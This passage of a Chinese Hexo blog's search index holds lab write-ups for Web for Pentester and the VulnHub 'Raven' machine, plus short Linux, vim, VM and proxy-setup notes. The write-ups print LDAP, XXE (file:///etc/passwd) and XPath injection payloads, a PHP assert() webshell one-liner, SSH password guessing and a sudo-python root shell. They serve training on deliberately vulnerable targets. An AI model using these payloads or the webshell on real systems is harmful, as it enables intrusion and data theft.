color=\"#FF7F50\">!(逻辑非)</font>\n此操作符用来排除具有特定属性的对象\n(!Name=John)\n查找所有name不为John的人员\n\n<font color=\"#FF7F50\">\\*通配符</font>\n可以用通配符表示值可以等于任何内容\n(Name=Jo*)\n查找所有Name以Jo开头的人员\n复杂点的例子:\n(&(Name=John)(|(live=Dallas)(live=Austin)))\n查找所有居住在Dallas或Austin，并且名为John的人员\n\n**用到的trick:**\n**`一些LDAP服务器授权null绑定：如果发送了空值，则LDAP服务器将继续绑定连接，PHP代码将认为凭据正确。 要获取具有2个null值的绑定，将需要从查询中完全删除此参数。 如果您在URL中保留诸如username=&password=之类的名称，则这些值将不起作用，因为它们不为null.`**\n{% asset_img 1.png trick %}\n正常提交,返回未认证的信息.接着利用上述技巧删除所有参数进行提交:\n{% asset_img 2.png 认证成功 %}\n<font color=\"red\">注:</font>这是一个非常重要的技巧,对将来要测试的所有登录表单执行这一步重要检查，即使后端不是基于LDAP的。\n\n### Example2 :\nLADP是支持使用通配符的\n先看原始请求:`name=hacker&password=hacker`\n{% asset_img 3.png trick %}\n因此以下几种注入都是可以的:\n```\nname=*&password=hacker\n截断:\nname=hacker))%00&password=hacker\n用户遍历:\nname=a*))%00&password=hacker\n```\n{% asset_img 4.png 枚举用户 %}\n## XXE篇\n`Example1:`\nXXE显注\n```xml\n<!DOCTYPE test [\n<!ENTITY x SYSTEM \"file:///etc/passwd\">]><test>&x;</test>\n```\nURL编码后提交:\n{% asset_img 5.png xxe1 %}\n\n`Example2:`\nXPATH注入,XPATH是用于查询XML文档的语言,你可以将XML想象成一个数据库,XPATH就为SQL语言,因此和SQL注入一样,XPATH也能注入,也能进行布尔逻辑判断:\n```\n' and '1'='1 \n' or '1'='0 \n' and '1'='0 \n' or '1'='1 \n```\n这里需要熟悉XPATH语法,推荐看[菜鸟教程](https://www.runoob.com/xpath/xpath-tutorial.html)\npayload:\n```\n查看兄弟节点值  \nhacker'%20or%201=1]/parent::*/child::node()%00\n\n查看带有password字段的值 \nhacker']/parent::*/password%00\n```\n--------------------------------------------------\n[靶机下载地址](https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/)","tags":["靶机","VulnHub"],"categories":["靶机","VulnHub"]},{"title":"VulnHub靶机系列:Raven","url":"/2020/10/24/VulnHub-Raven/","content":"## 前言\n该靶机难度中低档，本次任务是拿到4个flag和root权限。\n## 端口探测\n发现开启了22,80,111结果如下:\n{% asset_img 1.png \"端口探测\"%}\n浏览器访问80端口，然后点击主页上的链接并在源码中搜索**flag**字段看看,发现在service.html页面源码中隐藏的第一个flag:\n```\nflag1{b9bbcb33e11b80be759c4e844862482d}\n```\n<font color=\"LightSlateGray\">记得不要勾选<font color=\"LawnGreen\">**匹配词句**</font>否则搜不到flag</font>\n{% asset_img 2.png \"flag1\"%}\n接着用kali自带的dirb扫描目录看下:\n```bash\ndirb http://192.168.6.135 -o\n```\n{% asset_img 3.png \"扫描目录\"%}\n可以看到,前面几个都是一些静态资源,大概看了一下暂时没什么收获,/manual路径下是Apache的帮助手册,/wordpress表明该网站很有可能用wordpress搭建的,用Wpscan扫描了一下发现如下信息:\n```\n网站用户名2个:\nsteven\nmichael\nWP版本:4.8.12\n```\n/vender/目录如下:\n{% asset_img 4.png \"vender目录\"%}\n/vendor/path下暴露网站绝对路径:\n{% asset_img 5.png \"绝对路径\"%}\n/vendor/SECURITY.md,该文件提示了PHPMailer某些版本存在漏洞\n{% asset_img 6.png \"提示漏洞\"%}\n网上搜索一下PHPMailer细节:\n>phpMailer是一个非常强大的php发送邮件类,可以设定发送邮件地址、回复地址、邮件主题、html网页,上传附件,并且使用起来非常方便\n/vendor/VERSION:\n`结合上面内容来看应该是PHPMailer的版本号`\n{% asset_img 7.png \"版本号\"%}\n## 失败的漏洞利用\n根据security.md内容来看(PHPMailer 5.2.18之前的版本（2016年12月发布）易受[CVE-2016-10033]攻击远程代码执行漏洞),5.2.16版本是存在远程代码执行漏洞的,于是github上搜寻exp:\n[CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033)\n尝试使用exp,试了很多次,都提示没法利用该漏洞,只能先放弃:\n{% asset_img 8.png \"无法利用\"%}\n既然网上exp不能用,那试试MSF。首先按照CVE编号搜索对应的exp\n```bash\nsearch cve:2016-10033\n```\n{% asset_img 9.png \"msf_exp\"%}\n找到对应的exp，这里使用第一个。设置对应的值:\n{% asset_img 10.png \"payload设置\"%}\n标记为**yes**的就是需要给值的选项\nRHOST-远程主机:192.168.6.135\nRPORT-远程端口保持不变\nTARGETURI-保持不变\nWEB根目录-WEB_ROOT根据/vendor/path页面的提示应改为/var/www/html\n然后直接run:\n{% asset_img 11.png \"RUN\"%}\n依然失败,但我不死心,是不是参数有误?于是将web目录改为\\/var\\/www,继续RUN:\n{% asset_img 12.png \"KEEP RUN\"%}\n还是失败,再来一次,这次将目标URI改为/vendor试一试:\n{% asset_img 13.png \"JUST RUN\" %}\n\n结果依旧毫无波澜,看来远程代码执行这条路是真的行不通,虽然不甘心,但也只能换一条思路了。万一这是出题者故意留的坑也说不定呢,事后证明果然是坑。\n\n--------------------------------------------------\n## 整理信息\n回想一下,目前我们手中掌握的线索:\n+\t22,80,111开放\n+\tsteven,michael 两个网站用户名\n+\t网站使用Apache2.4.10+wordpress4.8.12搭建\n### SSH登录\n好像还有一条被我忽略的路:\n`22端口开放+已知用户名`\n很容易想到SSH暴力破解,说干就干呐。一般我在爆破前会用已有的信息做一些手工测试,不行的话再生成字典继续爆破。这里,可以首先尝试以下这四组用户\n```\nsteven:steven/nevets\nmichael:michael/leahcim\n```\n果然测试到**michael/michael**的时候成功了,真是柳暗花明又一村,nice!\n{% asset_img 14.png \"获取ssh账号\"%}\n经过一番查找,在**/var/www/**下发现第二个flag:\n```\nflag2{fc3fd58dcdad9ab23faca6e9a36e581c}\n```\n{% asset_img 15.png \"flag2\"%}\n## 数据库信息收集\n在/var/www/html/wordpress/wp-config.php发现数据库账号密码\n```\n数据库名:wordpress\n账号:root/R@v3nSecurity\n```\n{% asset_img 16.png \"数据库账号密码\"%}\n那可得登上数据库去好好翻一下,说不定就有收获,为了方便操作,我们写个小马在根目录下:\n```bash\necho '<?php assert($_REQUEST[a])?>' > s.php\n```\n然后用菜刀连上,并配置好数据库信息:\n{% asset_img 17.png \"菜刀连接\"%}\n翻看wordpress数据库的wp_users表发现网站的两个用户和密码hash:\n{% asset_img 18.png \"密码hash\"%}\n解出来steven的密码,也可以用kali自带的john:john hash.txt:\n`pink84`\n继续寻找看是否有隐藏flag,翻来翻去最后在wp_post表里发现了余下的2个flag,运气不错哈哈:\n```\nflag3{afc01ab56b50591e7dccf93122770cd2}\nflag4{715dea6c055b9fe3337544932f2941ce}\n```\n{% asset_img 19.png \"flag3和4\"%}\n## 提权\n那么这就来到最后一步了,拿到shell不想着提权的人不是好黑客。\n盲猜数据库和主机root密码是一样的:\n{% asset_img 20.png \"盲猜失败\"%}\n显然我们猜想错误,没有root密码,那还是老老实实考虑提权吧。\n首先查看系统内核信息:\n```bash\nuname -a \n```\n{% asset_img 21.png \"查看内核版本\"%}\n内核版本 3.16,有点高啊,去github上找找看对应的exp:\n[Linux内核提权](https://github.com/SecWiki/linux-kernel-exploits),这个库里包含有很多的Linux内核提权exp。\n我们先在这个库中搜索3.16,找到内核3.16的exp。只搜到一个CVE-2015-1328,下载对应的c文件,编译执行:发现该exp并不能用\n{% asset_img 22.png \"提权失败\"%}\n有可能这个库刚好没有合适exp呢,换个搜索exp的方式,github上有个exp建议工具,会给出建议的exp,工具链接如下:`https://github.com/jondonas/linux-exploit-suggester-2`\n将工具下载到目标机上执行:\n```bash\ngit clone https://github.com/jondonas/linux-exploit-suggester-2\ncd linux-exploit-suggester-2\n./linux-exploit-suggester-2\n```\n结果显示有三个推荐的exp\n* cve-2016-5159\n* cve-2018-14665\n* cve-2015-8660\n先试试第一个,即大名鼎鼎的脏牛。去到结果中给出的链接,复制下载链接:\n{% asset_img 23.png \"脏牛\"%}\n将文件下载到目标机,并重命名为dirtycow.c,然后编译执行:\n{% asset_img 24.png \"提权失败\"%}\n提示会等上一会儿,但半小时都过去了也没见动静儿啊,于是又重复执行几次,结果还是一样,脏牛提权宣告失败。\n往下看了建议的后面两个exp也都用不了,内核提权陷入僵局。\n咱内核提权不了,看看应用呗。不是安装了MySQL吗,试试用它提权。咱去github上搜索一下mysql提权看能否有所收获。输入关键字:`mysql privilege`\n{% asset_img 25.png \"github搜索\"%}\n前两个就好像很不错的样子,试一试吧,先看第一个:\n发现是windows下mysql提权(dll,udf,mof,启动项等手法),看下一个有个Linux下的mysql提权,但是使用gcc进行编译的时候,遇到错误(-Wl,是l而不是I或者1):\n{% asset_img 26.png \"MySQL提权报错\"%}\n网上说加上-fPIC参数即可,但我用了还是无果,含泪放弃该条路..（还是太菜了囧）\n### 菜鸡流泪\n最后实在没辙,去网上看了看大佬的write-up。学到一招。\n上面我们已经得到了steven账号的密码:pink84\n切换过去,查看`sudo -l`:\n{% asset_img 27.png \"菜鸡如我\"%}\n可以看到,steven账号不需要root密码即可执行sudo Python,那我们即可直接利用python进行提权:\n```bash\nsudo python -c 'import os;os.system(\"/bin/bash\")'\n```\n{% asset_img 28.png \"python提权\"%}\n成功!可是这和我又有什么关系呢,强是大佬的,我只有菜..\n{% asset_img 29.jpg \"除了菜我一无所有\"%}\n赶紧切到root的home目录,看到flag4.txt成功获取第四个flag\n{% asset_img 30.png \"flag4\"%}\n至此,全部四个flag都被我们找到了:\n```bash\nflag1{b9bbcb33e11b80be759c4e844862482d}\nflag2{fc3fd58dcdad9ab23faca6e9a36e581c}\nflag3{afc01ab56b50591e7dccf93122770cd2}\nflag4{715dea6c055b9fe3337544932f2941ce}\n```\n## 总结\n最后提权一步,由于自己知识面匮乏,没想到这种方式。全部流程下来学到了不少新东西,渗透最重要的还是细心,要善于利用已知的信息去发现问题。自己还是too Young!\n### 技术要点\n\t*\t收集目标信息制作字典\n\t*\tssh枚举\n\t*\tsudo -l sudo文件里查看可利用的命令\n\t*\t利用python执行bash命令提权\n\n\n\n\n","tags":["靶机","VulnHub"],"categories":["靶机","VulnHub"]},{"title":"Linux命令的查找顺序","url":"/2020/04/11/linux-command-order/","content":"\nLinux系统中往往包含都多个相同的命令，比如ls就有/bin/ls;/usr/bin/ls,那到底哪一个命令先被执行呢.\n通常的查找顺序是：\n1. 以相对/绝对路径执行命令，比如 /bin/ls或者./ls\n2. 由alias找到该命令\n3. 由bash内置(builtin)命令来执行\n4. 通过$PATH环境变量来找到第一个命令来执行\n\n---\t\n查看你命令的查找顺序可以用 <font color=\"#A52A2A\">type -a command</font>","categories":["Linux"]},{"title":"浅谈vim粘贴复制","url":"/2020/04/11/vim-copyandpaste/","content":"vim帮助文档里与粘贴板有关的内容如下：\n* vim有17个粘贴板，分别是**<font color=#FF0000>\"、 0、1、2、··· 9、-、*、＋、% 、 : 、/ </font>** 用<font color=#FF0000>:reg</font>命令可以查看各个粘贴板里的内容。在vim中简单用y只是复制到\"(双引号)粘贴板里，同样用p粘贴的也是这个粘贴板里的内容\n* 要将vim的内容复制到某个粘贴板，需要退出编辑模式，进入正常模式后，选择要复制的内容，然后按<font color=#FF0000>\"Ny</font>完成复制，其中N为粘贴板号(注意是按一下双引号然后按粘贴板号最后按y)，例如要把内容复制到粘贴板a，选中内容后按<font color=#FF0000>\"ay</font>就可以了，有两点需要说明一下：\n\t1. VIM内部(\"): \"号粘贴板（临时粘贴板）比较特殊，直接按y就复制到这个粘贴板中了，直接按p就粘贴这个粘贴板中的内容（也可以说是VIM专用吧）\n\t1. 与外部程序交互(*/+): +号粘贴板是系统粘贴板，用<font color=#FF0000>\"+y</font>将内容复制到该粘贴板后可以使用Ctrl＋V将其粘贴到其他文档（如firefox、gedit）中，同理，要把在其他地方用Ctrl＋C或右键复制的内容复制到vim中，需要在正常模式下按<font color=#FF0000>\"+p</font>；\n* 要将vim某个粘贴板里的内容粘贴进来，需要退出编辑模式，在正常模式按<font color=#FF0000>\"Np</font>，其中N为粘贴板号，如上所述，可以按<font color=#FF0000>\"5p</font>将5号粘贴板里的内容粘贴进来，也可以按<font color=#FF0000>\"+p(\"+*也行)</font>将系统全局粘贴板里的内容粘贴进来\n"},{"title":"Linux忘记root密码解决方案","url":"/2020/04/11/linux-passforget/","content":"### 你是否和我一样经常会忘记Linux root密码 \n\n需要重新安装吗?不需要的,你只要以单用户维护模式登录即.更改你的root密码,这里使用grub引导装载程序作为范例介绍:\n* 首先将系统重启，在读秒时按下任意键就会出现菜单界面，仔细看菜单下面说明，按下e就能进入grub的编辑模式了。\n* 此时将光标移至kernel那一行，再按一次e进入kernel该行的编辑界面，然后在出现的界面当中，最后方输入single，按下enter后，再按下b可以进入单用户维护模式了。\n* 在这个模式下，你会在tty1的地方不需要输入密码即可获得终端的root控制权，然后就可以用passwd更改你的root密码了","tags":["Linux"],"categories":["Linux"]},{"title":"vm虚拟机挂起后无法打开的问题","url":"/2020/04/11/vm-guaqi/","content":"### 解决方案:\n强制关闭vm客户端，然后再使用管理员权限打开即可\n\n\n\n\n","tags":["虚拟机"],"categories":["虚拟机"]},{"title":"Hexo","url":"/2020/03/30/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is my first post. Check [documentation](https://hexo.io/docs/) for more info.\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","tags":["Start","Hexo"]},{"title":"v2ray+Cloudflare搭建梯子","url":"/2020/03/30/v2ray-ws-tls/","content":"1. 首先在阿里云买一个域名,需要实名认证,等认证完成后\n\n2. 去cloudflare注册一个账号,填入自己的域名,选择免费套餐,根据提示将域名的DNS服务器换成cloudflare的DNS服务器\n\n3. 在cloudflare DNS 选项卡那边添加一个 A 记录的域名解析，假设你的域名是 **weigr.top**，并且想要使用 **weigr.top** 作为翻墙的域名,那么在 DNS 那里配置，Name 写 www，IPv4 address 写你的 VPS IP，**务必把云朵点灰**，然后选择 Add Record 来添加解析记录即可\n\n4. 然后在VPS上安装V2ray:[教程地址](https://github.com/233boy/v2ray/wiki/使用Cloudflare中转V2Ray流量)\n\n5. 回到cloudeflare中,确保 Cloudflare 的 Crypto 选项卡的 SSL 为 Full,然后在 DNS 选项卡那里，把刚才点灰的那个云朵图标，点亮它，一定要**点亮云朵**,图标务必为橙色状态，即是 DNS and HTTP proxy(CDN)\n![点亮云朵](/images/1.png)\n\n6. 下载V2ray客户端:[下载v2ray客户端](https://github.com/233boy/v2ray/wiki/V2RayN使用教程)\n\n7. 按照你刚才搭建的VPS配置,信息填入客户端中:![v2rayN配置](/images/v2rayN.png)\n--------------------------------------------------\n__注意此时我们的服务器地址要填写我们的域名,因为使用的域名作为解析穿过CDN到达VPS.__","tags":["V2ray","CloudFlare","CDN"],"categories":["搭建梯子"]}]